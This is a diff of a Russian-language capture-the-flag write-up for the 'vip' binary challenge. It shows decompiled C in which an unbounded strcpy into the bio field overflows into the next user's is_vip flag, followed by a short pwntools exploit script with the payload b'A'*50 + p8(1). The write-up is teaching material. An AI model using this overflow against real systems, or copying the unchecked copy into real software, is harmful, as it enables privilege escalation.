@@ -5,25 +5,119 @@ nc 109.233.56.90 11510
 **[vip](https://pwn.spbctf.ru/files/overflow/vip)**
 
 В точке входа первым делом создаётся аккаунт админа.
-![Pasted image 20260309153917](../../../../z.%20Images/Pasted%20image%2020260309153917.png)
-![{598EFBDE-BFC4-41AA-8089-513B975DEC4B}](../../../../z.%20Images/{598EFBDE-BFC4-41AA-8089-513B975DEC4B}.png)
+``` C
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  add_admin();
+  menu();
+}
+
+__int64 __fastcall add_admin()
+{
+  users[0].is_vip = 1;
+  strcpy((char *)&user_1, "admin");
+  strcpy((char *)&password_1, "****************");
+  return '********';
+}
+```
 Чтобы получить флаг надо быть vip юзером.
 
 Меню:
-![{8DF361E2-1F65-4B1C-AC12-E2338676905E}](../../../../z.%20Images/{8DF361E2-1F65-4B1C-AC12-E2338676905E}.png)
+``` c
+switch ( v3 )
+{
+  case 3:
+    show_users();
+    break;
+  case 1:
+    printf("Enter username: ");
+    __isoc99_scanf("%s", username);
+    printf("Enter password: ");
+    __isoc99_scanf("%s", password);
+    putchar(10);
+
+    login(username, password);
+    break;
+  case 2:
+    printf("Enter username: ");
+    __isoc99_scanf("%s", username);
+    printf("Enter password: ");
+    __isoc99_scanf("%s", password);
+    printf("Enter information about youself: ");
+    __isoc99_scanf("%s", bio);
+    putchar(10);
+
+    reg(username, password, bio);
+    break;
+}
+```
 3 - выводит всех пользователей.
 1 - вход в аккаунт.
 2 - регистрация.
 
 Создаю структуру:
-![{A4B175B1-8881-4B0F-A2BD-F00906779337}](../../../../z.%20Images/{A4B175B1-8881-4B0F-A2BD-F00906779337}.png)
+``` c![](../../../../{DD5AC3E5-B973-417B-96A3-6D8C57D34355}.png)![](../../../../{DD5AC3E5-B973-417B-96A3-6D8C57D34355}%201.png)![](../../../../{DD5AC3E5-B973-417B-96A3-6D8C57D34355}%202.png)
+struct __fixed(0x6F) user // sizeof=0x6F
+{
+  bool is_vip;
+  char username[30];
+  char password[30];
+  char bio[50];
+};
+```
 
 Вход в аккаунт:
-![Pasted image 20260309154059](../../../../z.%20Images/Pasted%20image%2020260309154059.png)
+``` c
+void __fastcall reg(char *username, char *password, char *bio)
+{
+  int j; // [rsp+28h] [rbp-8h]
+  int i; // [rsp+2Ch] [rbp-4h]
+
+  for ( i = 0; i <= 9; ++i )
+  {
+    if ( !strcmp(users[i].username, username) )
+    {
+      puts("Username exists");
+      return;
+    }
+  }
+  for ( j = 0; ; ++j )
+  {
+    if ( j > 9 )
+    {
+      printf("No space left for registration. Exiting...");
+      exit(0);
+    }
+    if ( !users[j].username[0] )
+      break;
+  }
+
+  strcpy(users[j].username, username);
+  strcpy(users[j].password, password);
+  strcpy(users[j].bio, bio);
+}
+```
 В алгоритме регистрации лежит уязвимость, т.к. все userы лежат подряд в памяти, я могу зарегистрировать пользователя, указать имя, пароль, а буфер bio переполнить и указать для следующего юзера is_vip == 1, т.к. переменная is_vip не перезаписывается.
 
-Создание аккаунта
-![{A3D2F838-E989-44ED-A645-1B7A7DCC17E7}](../../../../z.%20Images/{A3D2F838-E989-44ED-A645-1B7A7DCC17E7}.png)
+Эксплоит:
+``` python
+io = start()
+
+io.recvuntil(b'exit')
+
+# Создание аккаунта
+io.sendline(b'2')
+io.recvuntil(b': ')
+io.sendline(b'1')
+io.recvuntil(b': ')
+io.sendline(b'1')
+io.recvuntil(b': ')
+payload = b'A' * 50 + p8(1)
+io.sendline(payload)
+
+# флаг руками достать можно
+io.interactive()
+```
 
 Проверка:
 ![{B83DD1A1-2EA0-4AA4-976E-4FF74F1E1F84}](../../../../z.%20Images/{B83DD1A1-2EA0-4AA4-976E-4FF74F1E1F84}.png)
